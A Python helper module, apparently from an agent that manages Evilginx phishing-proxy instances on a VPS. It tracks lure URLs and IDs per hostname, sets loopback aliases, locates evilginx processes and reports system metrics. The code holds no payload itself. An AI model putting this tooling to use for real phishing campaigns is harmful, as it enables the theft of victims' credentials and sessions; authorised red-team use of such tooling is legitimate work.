"""System-level helpers: loopback aliases, process lifecycle, agent state file."""
import json
import logging
import os
import signal
import subprocess
import sys
import time
from pathlib import Path

logger = logging.getLogger("agent.system")

STATE_VERSION = 1


class StateStore:
    """Persistent view of instances this VPS manages (hostname -> loopback)."""

    def __init__(self, state_file: str):
        self.path = Path(state_file)

    def load(self) -> dict:
        if not self.path.exists():
            return {"version": STATE_VERSION, "instances": {}}
        try:
            return json.loads(self.path.read_text())
        except (json.JSONDecodeError, OSError):
            return {"version": STATE_VERSION, "instances": {}}

    def save(self, state: dict):
        self.path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self.path.with_suffix(".tmp")
        tmp.write_text(json.dumps(state, indent=2))
        tmp.replace(self.path)

    def add(self, hostname: str, loopback_ip: str, config_dir: str, lure_url: str, lure_id: str):
        state = self.load()
        state["instances"][hostname] = {
            "loopback_ip": loopback_ip,
            "config_dir": config_dir,
            "lure_url": lure_url,
            "lure_id": lure_id,
        }
        self.save(state)

    def remove(self, hostname: str):
        state = self.load()
        state["instances"].pop(hostname, None)
        self.save(state)

    def all(self) -> dict:
        return self.load().get("instances", {})


def get_public_ip() -> str | None:
    import httpx
    for url in ("https://api.ipify.org", "https://icanhazip.com"):
        try:
            with httpx.Client(timeout=5) as c:
                return c.get(url).text.strip()
        except Exception:
            continue
    return None


def add_loopback(ip: str, name: str, apply: bool = True) -> bool:
    if not apply:
        logger.info("[dry-run] would add loopback alias %s/32 (label %s)", ip, name)
        return True
    try:
        subprocess.run(["ip", "addr", "add", f"{ip}/32", "dev", "lo", "label", f"lo:{name}"], check=False, capture_output=True)
        subprocess.run(["ip", "route", "add", "local", ip, "dev", "lo"], check=False, capture_output=True)
        logger.info("added loopback alias %s", ip)
        return True
    except FileNotFoundError:
        logger.error("ip command not available; loopback alias not applied")
        return False


def del_loopback(ip: str, apply: bool = True) -> bool:
    if not apply:
        logger.info("[dry-run] would remove loopback alias %s", ip)
        return True
    try:
        subprocess.run(["ip", "addr", "del", f"{ip}/32", "dev", "lo"], check=False, capture_output=True)
        return True
    except FileNotFoundError:
        return False


def find_evilginx_pid(repo_dir: str) -> int | None:
    """Return the PID of the evilnginx process using config_dir==repo_dir if running."""
    try:
        out = subprocess.run(["pgrep", "-f", f"evilginx -c {repo_dir}"], capture_output=True, text=True).stdout.strip()
    except FileNotFoundError:
        return None
    return int(out.splitlines()[0]) if out else None


def kill_process(process, timeout: int = 10) -> None:
    if process is None or process.poll() is not None:
        return
    try:
        process.send_signal(signal.SIGTERM)
        process.wait(timeout=timeout)
    except (subprocess.TimeoutExpired, ProcessLookupError):
        try:
            process.kill()
        except ProcessLookupError:
            pass
    time.sleep(0.5)


def ps_metrics() -> tuple[float | None, float | None, float | None]:
    """Return (load_avg, mem_pct, disk_pct) or Nones on non-Linux."""
    try:
        load = os.getloadavg()[0]
        with open("/proc/meminfo") as f:
            meminfo = {}
            for line in f:
                k, v = line.split(":", 1)
                meminfo[k] = int(v.split()[0])
        mem_pct = 100.0 * (1 - meminfo["MemAvailable"] / meminfo["MemTotal"])
        disk = subprocess.run(["df", "-P", "/"], capture_output=True, text=True).stdout.splitlines()[1].split()
        disk_pct = float(disk[4].rstrip("%"))
        return load, mem_pct, disk_pct
    except Exception:
        return None, None, None


def is_linux() -> bool:
    return sys.platform.startswith("linux")